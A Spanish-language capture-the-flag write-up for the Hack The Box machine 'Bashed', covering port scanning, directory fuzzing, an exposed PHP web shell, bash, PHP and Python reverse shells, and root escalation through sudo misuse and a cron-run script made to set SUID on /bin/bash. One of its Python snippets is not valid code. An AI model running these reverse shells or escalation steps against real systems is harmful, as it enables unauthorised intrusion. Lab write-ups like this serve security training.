---
layout: single
title: Bashed - Hack The Box
excerpt: "Una máquina realmente sencilla, si acaso lo que costo un poquillo fue el cómo usar el comando scriptmanager, pero de ahí en fuera, todo fue fácil. Vamos a aprovecharnos de una subpágina que es una shell de bash como web, la cual vamos a usar para conectarnos de manera remota y en la cual, usaremos el usuario scriptmanager para escalar privilegios, usando un script en Python con él cambiaremos los permisos de la Bash para convertirnos en Root."
date: 2023-04-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-bashed/bashed_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Fuzzing
  - WebShell Bash
  - Reverse Shell
  - Script Manager
  - CronJob Exploitation
  - Abusing Sudoers Privilege
  - OSCP Style
---
![](/assets/images/htb-writeup-bashed/bashed_logo.png)

Una máquina realmente sencilla, si acaso lo que costo un poquillo fue el cómo usar el comando **scriptmanager**, pero de ahí en fuera, todo fue fácil. Vamos a aprovecharnos de una subpágina que es una shell de bash como web, la cual vamos a usar para conectarnos de manera remota y en la cual, usaremos el usuario **scriptmanager** para escalar privilegios, usando un script en **Python** con él cambiaremos los permisos de la **Bash** para convertirnos en **Root**.

Herramientas utilizadas:
* *nmap*
* *wappalizer*
* *wfuzz*
* *gobuster*
* *nc*
* *wget*
* *bash*
* *python3*
* *find*
* *crontab*


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
				<ul>
					<li><a href="#NMAP">Fuzzing con NMAP</a></li>
                                </ul>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#RevShells">Ganando Acceso a la Máquina Víctima con Distintas Reverse Shell</a></li>
				<ul>
					<li><a href="#Bash">Utilizando Bash para Conectarnos de Manera Remota</a></li>
					<li><a href="#Shell">Cargando una Reverse Shell</a></li>
					<li><a href="#Python">Usando Reverse Shell de Python</a></li>
				</ul>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#SSH">Enumeración Servicio SSH</a></li>
				<li><a href="#Root">Acceso como Root Usando Tarea Cron</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL veremos que SO utiliza la máquina.
```bash
ping -c 4 10.10.10.68
PING 10.10.10.68 (10.10.10.68) 56(84) bytes of data.
64 bytes from 10.10.10.68: icmp_seq=1 ttl=63 time=129 ms
64 bytes from 10.10.10.68: icmp_seq=2 ttl=63 time=129 ms
64 bytes from 10.10.10.68: icmp_seq=3 ttl=63 time=129 ms
64 bytes from 10.10.10.68: icmp_seq=4 ttl=63 time=130 ms

--- 10.10.10.68 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 128.647/129.243/130.365/0.663 ms
```
Gracias al TTL, sabemos que la máquina usa Linux. Hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.68 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 15:28 CST
Initiating SYN Stealth Scan at 15:28
Scanning 10.10.10.68 [65535 ports]
Discovered open port 80/tcp on 10.10.10.68
Completed SYN Stealth Scan at 15:29, 25.99s elapsed (65535 total ports)
Nmap scan report for 10.10.10.68
Host is up, received user-set (0.78s latency).
Scanned at 2023-04-17 15:28:59 CST for 26s
Not shown: 50222 filtered tcp ports (no-response), 15312 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.09 seconds
           Raw packets sent: 124306 (5.469MB) | Rcvd: 15355 (614.220KB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo hay un puerto abierto que ya conocemos, hagamos el escaneo de servicios para ver que nos dice.

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sC -sV -p80 10.10.10.68 -oN targeted                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 15:52 CST
Nmap scan report for 10.10.10.68
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Solo nos menciona que usa el servicio **Apache**. Vamos a analizar la página.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Vamos a entrar:

![](/assets/images/htb-writeup-bashed/Captura1.png)

Bien, es una página algo simple. Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-bashed/Captura2.png">
</p>

Mmmmm no nos dice mucho, sigamos viendo la página. Hay una publicación de alguien llamado **Development**, ¿será un usuario? Quizá nos sirva más adelante.

![](/assets/images/htb-writeup-bashed/Captura3.png)

Si investigamos el **GitHub** que nos menciona la publicación, podemos ver que es una herramienta que usa **Bash**, usada en **PHP**. En resumen, podemos usar una **terminal bash** dentro de la página web, usando cualquiera de los dos archivos que vienen en el **GitHub**. Ósea, **phpbash.php** o **phpbash.min.php**.

![](/assets/images/htb-writeup-bashed/Captura4.png)

Por lo que entiendo, la máquina está usando dicha herramienta, así que debería estar cargada, pero como no sabemos donde está, vamos a hacer un **Fuzzing**.

<h2 id="Fuzz">Fuzzing</h2>

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.68/FUZZ/         
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.68/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000001:   200        161 L    397 W      7743 Ch     "# directory-list-2.3-medium.txt"                                    
000000003:   200        161 L    397 W      7743 Ch     "# Copyright 2007 James Fisher"                                      
000000007:   200        161 L    397 W      7743 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"    
000000338:   200        16 L     59 W       939 Ch      "php"                                                                
000000016:   200        19 L     88 W       1564 Ch     "images"                                                             
000000014:   200        161 L    397 W      7743 Ch     "http://10.10.10.68//"                                               
000000013:   200        161 L    397 W      7743 Ch     "#"                                                                  
000000012:   200        161 L    397 W      7743 Ch     "# on atleast 2 different hosts"                                     
000000011:   200        161 L    397 W      7743 Ch     "# Priority ordered case sensative list, where entries were found"   
000000010:   200        161 L    397 W      7743 Ch     "#"                                                                  
000000009:   200        161 L    397 W      7743 Ch     "# Suite 300, San Francisco, California, 94105, USA."                
000000006:   200        161 L    397 W      7743 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"      
000000008:   200        161 L    397 W      7743 Ch     "# or send a letter to Creative Commons, 171 Second Street,"         
000000005:   200        161 L    397 W      7743 Ch     "# This work is licensed under the Creative Commons"                 
000000002:   200        161 L    397 W      7743 Ch     "#"                                                                  
000000004:   200        161 L    397 W      7743 Ch     "#"                                                                  
000000550:   200        20 L     96 W       1758 Ch     "css"                                                                
000000834:   200        17 L     69 W       1148 Ch     "dev"                                                                
000000953:   200        26 L     165 W      3165 Ch     "js"                                                                 
000000083:   403        11 L     32 W       292 Ch      "icons"                                                              
000002771:   200        21 L     111 W      2095 Ch     "fonts"                                                              
000000164:   200        1 L      1 W        14 Ch       "uploads"                                                            
000045240:   200        161 L    397 W      7743 Ch     "http://10.10.10.68//"                                               
000095524:   403        11 L     32 W       300 Ch      "server-status"                                                      

Total time: 532.2590
Processed Requests: 220560
Filtered Requests: 220536
Requests/sec.: 414.3847
```

| Parámetros | Descripción |
|--------------------------|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

<br>

Ahora, probemos con **Gobuster**:

```bash
gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/server-status        (Status: 403) [Size: 299]
Progress: 220483 / 220561 (99.96%)
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

<br>

Pues arrojo casi los mismos resultados, solo por curiosidad, veamos que nos dice **nmap** cuando apliquemos **fuzzing**.

<h3 id="NMAP">Fuzzing con NMAP</h3>

```bash
nmap --script http-enum -p80 -oN webScan 10.10.10.68
Nmap 7.93 scan initiated Mon Apr 17 18:50:30 2023 as: nmap --script http-enum -p80 -oN webScan 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /uploads/: Potentially interesting folder

Nmap done at Mon Apr 17 18:50:47 2023 -- 1 IP address (1 host up) scanned in 16.66 seconds
```

Muy bien, hay varios directorios, pero en este caso me interesan 3, la de **php**, **uploads** y **dev**. 

Si tratamos de entrar a **php** y **uploads**, no encontraremos nada de interés, así que vámonos a la **dev**.

![](/assets/images/htb-writeup-bashed/Captura5.png)

A cualquiera de esos archivos que le demos click, nos va a mandar a una **bash interactiva** desde la web, pero como es muy lenta vamos a conectarnos de manera remota.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="RevShells">Ganando Acceso a la Máquina Víctima con Distintas Reverse Shell</h2>

Podemos hacer 2 cosas para tratar de conectarnos de manera remota, una sería usando un script en **bash** y la otra cargando una **Reverse Shell** en la carpeta **uploads** de la página.

<br>

<h3 id="Bash">Utilizando Bash para Conectarnos de Manera Remota</h3>

Bueno, hagamoslo por pasos:
* Alzamos una **netcat**:
```bash
nc -nvlp 443                              
listening on [any] 443 ...
```

* Vamos a usar el siguiente one-liner que es una **Reverse Shell**:
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"
```
PERO, vamos a **url encodearlo** cambiando los **ampersands (&)** por **%26**. Una vez que lo hagas, ejecutalo y ya debería estar:

![](/assets/images/htb-writeup-bashed/Captura6.png)

* Y ya deberíamos estar conectados:
```bash
nc -nvlp 443                                                    
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.68] 45400
bash: cannot set terminal process group (815): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/var/www/html/dev$ 
www-data@bashed:/var/www/html/dev$ whoami
whoami
www-data
```

De una vez, vamos a obtener una sesión interactiva, sigue estos pasos:

* Escribe el siguiente comando:
```bash
script /dev/null -c bash
```

* Presiona las teclas **ctrl + z**, debería aparecer el siguiente mensaje y luego la terminal de tu máquina:
```bash
zsh: suspended  nc -nvlp 443
```

* Ahora escribe el siguiente comando en tu máquina:
```bash
 stty raw -echo; fg       
[1]  + continued  nc -nvlp 443
```

* Escribe **reset** y te preguntará que tipo de terminal quieres, pon **xterm**:
```bash
[1]  + continued  nc -nvlp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

* Exportemos **xterm**, **bash** y cambiemos el tamaño de la terminal (este último es opcional, pero lo recomiendo):
```bash
www-data@bashed:/var/www/html/dev$ export TERM=xterm
www-data@bashed:/var/www/html/dev$ export SHELL=bash
www-data@bashed:/var/www/html/dev$ stty rows 51 columns 189
```
Y listo, ya tenemos nuestra terminal interactiva.

<br>

<h3 id="Shell">Cargando una Reverse Shell</h3>

Recordemos 2 cosas, una que la página trabaja con **PHP** y que tiene una carpeta llamada **uploads**.

<p align="center">
<img src="/assets/images/htb-writeup-bashed/Captura7.png">
</p>

Bien, ya conocemos una **Reverse Shell** de **PHP**, busquemos a **Pentestmonkey**:
* https://github.com/pentestmonkey/php-reverse-shell

Ahora, hagamos todo por pasos:
* Clonamos la **Reverse Shell** de **PHP**:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

* Modificamos la **Reverse Shell** con nuestra **IP** y un puerto:
```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = 'Pon Aqui Tu IP';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

* Levantamos un servidor en python en donde tenemos la **Reverse Shell**:
```bash
python3 -m http.server   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* Ahora en la página web, descargamos la **Reverse Shell**:
```bash
wget Tu_IP:8000/php-reverse-shell.php
```

<p align="center">
<img src="/assets/images/htb-writeup-bashed/Captura8.png">
</p>

* Bien, alzamos una netcat:
```bash
nc -nvlp 443                                                    
listening on [any] 443 ...
```

* Cargamos la página:

![](/assets/images/htb-writeup-bashed/Captura9.png)

Y ya deberíamos estar conectados.

<br>

<h3 id="Python">Usando Reverse Shell de Python</h3>

Con **python**, podemos ganar acceso de manera remota si utilizamos un one-liner que usa sockets para estableces una conexión, entre nuestra máquina y la máquina víctima, PERO no es una sesión interactiva, es decir, que no podremos usar **nano**. 

Nunca esta demás usar siempre otras alternativas. Vamos a hacerlo por pasos:

* Alzamos una **netcat**:
```bash
nc -nvlp 443                              
listening on [any] 443 ...
```

* Utiliza el siguiente one-liner de **Python** que es una **Reverse Shell**:
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Tu_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

* Observa el resultado en la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.62] from (UNKNOWN) [10.10.10.68] 60532
www-data@bashed:/var/www/html/dev$ whoami
whoami
www-data
www-data@bashed:/var/www/html/dev$
```
Y con esto terminamos.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="SSH">Enumeración Servicio SSH</h2>

Bueno, como siempre buscamos el directorio **/home** para encontrar la flag del usuario.
```bash
www-data@bashed:/var/www/html/dev$ cd /home
www-data@bashed:/home$ ls -la
total 16
drwxr-xr-x  4 root          root          4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
drwxr-xr-x  4 arrexel       arrexel       4096 Jun  2  2022 arrexel
drwxr-xr-x  3 scriptmanager scriptmanager 4096 Dec  4  2017 scriptmanager
www-data@bashed:/home$ cd arrexel/
www-data@bashed:/home/arrexel$ ls -la
total 32
drwxr-xr-x 4 arrexel arrexel 4096 Jun  2  2022 .
drwxr-xr-x 4 root    root    4096 Dec  4  2017 ..
lrwxrwxrwx 1 root    root       9 Jun  2  2022 .bash_history -> /dev/null
-rw-r--r-- 1 arrexel arrexel  220 Dec  4  2017 .bash_logout
-rw-r--r-- 1 arrexel arrexel 3786 Dec  4  2017 .bashrc
drwx------ 2 arrexel arrexel 4096 Dec  4  2017 .cache
drwxrwxr-x 2 arrexel arrexel 4096 Dec  4  2017 .nano
-rw-r--r-- 1 arrexel arrexel  655 Dec  4  2017 .profile
-rw-r--r-- 1 arrexel arrexel    0 Dec  4  2017 .sudo_as_admin_successful
-r--r--r-- 1 arrexel arrexel   33 Apr 17 14:24 user.txt
www-data@bashed:/home/arrexel$ cat user.txt
```

Listo, ahora veamos nuestros privilegios:
```bash
www-data@bashed:/home/arrexel$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bashed:/home/arrexel$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

Mmmm no sé qué es eso de **scriptmanager**, vamos a buscar un poco para ver de que se trata. 

Encontré este link:
* https://f1uffygoat.com/privesc/

Vamos a entrar como **scriptmanager**:
```bash
www-data@bashed:/home/arrexel$ sudo -u scriptmanager bash
scriptmanager@bashed:/home/arrexel$ 
scriptmanager@bashed:/home/arrexel$ whoami
scriptmanager
```

Pero aún no podemos hacer nada, pues si intentas usar comandos como **SUDO**, no vamos a poder hacer nada. ¿Qué podemos hacer entonces? Vamos a buscar que archivos podemos modificar:
```bash
scriptmanager@bashed:/$ find / -type f -user scriptmanager 2>/dev/null
/scripts/test.py
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
/proc/2374/task/2374/fdinfo/0
/proc/2374/task/2374/fdinfo/1
/proc/2374/task/2374/fdinfo/2
/proc/2374/task/2374/fdinfo/255
/proc/2374/task/2374/environ
...
```

Veo algo curioso ahí, un archivo en Python dentro del directorio **scripts**, vamos a investigarlo:
```bash
scriptmanager@bashed:/$ cd /scripts
scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Apr 17 17:17 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Apr 17 17:37 test.txt
```

Mmmmmm hagamos un **cat** al contenido:
```bash
scriptmanager@bashed:/scripts$ cat test.py 
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt 
testing 123!
```
Quiero pensar, que el script de **Python** se ejecuta automáticamente como una **tarea cron**, entonces debemos aprovecharnos de eso.

<h2 id="Root">Acceso como Root Usando Tarea Cron</h2>

Ahora, sabemos que podemos usar **nano** dentro la máquina víctima, vamos a modificar el script de **Python** para que modifique los permisos de la **bash**, para que cualquier usuario pueda entrar como **Root**. 

* Revisa los permisos de la bash:
```bash
scriptmanager@bashed:/scripts$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

* Opción 1 - borra el contenido del script y pon lo siguiente:
```python
import os

chmod u+s /bin/bash
```

* Opción 2 - crea un script aparte con el mismo código que creamos en la opción 1:
```bash
echo "import os; os.system('chmod u+s /bin/bash');" > exploit.py
```

* Excelente, una vez que guardes y cierres o que hayas usado la opción 2, revisa los permisos de la **bash**:
```bash
scriptmanager@bashed:/scripts$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

Listo, entra a la **bash** como **Root**:
```bash
scriptmanager@bashed:/scripts$ bash -p
bash-4.3# whoami
root
bash-4.3# cd /root
bash-4.3# ls -la
total 28
drwx------  3 root root 4096 Jun  2  2022 .
drwxr-xr-x 23 root root 4096 Jun  2  2022 ..
lrwxrwxrwx  1 root root    9 Jun  2  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root 3121 Dec  4  2017 .bashrc
drwxr-xr-x  2 root root 4096 Jun  2  2022 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Dec  4  2017 .selected_editor
-r--------  1 root root   33 Apr 17 14:24 root.txt
bash-4.3# cat root.txt
```

Excelente, ya solamente revisemos si fue una **tarea cron** la que nos ayudo a ganar acceso:
```bash
bash-4.3# crontab -l
* * * * * cd /scripts; for f in *.py; do python "$f"; done
```
Y si, con esto terminamos esta máquina.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>


* https://f1uffygoat.com/privesc/
* https://www.revshells.com/
* https://github.com/pentestmonkey/php-reverse-shell
* https://esgeeks.com/post-explotacion-transferir-archivos-windows-linux/
* https://ironhackers.es/tutoriales/como-conseguir-tty-totalmente-interactiva/


<br>
# FIN
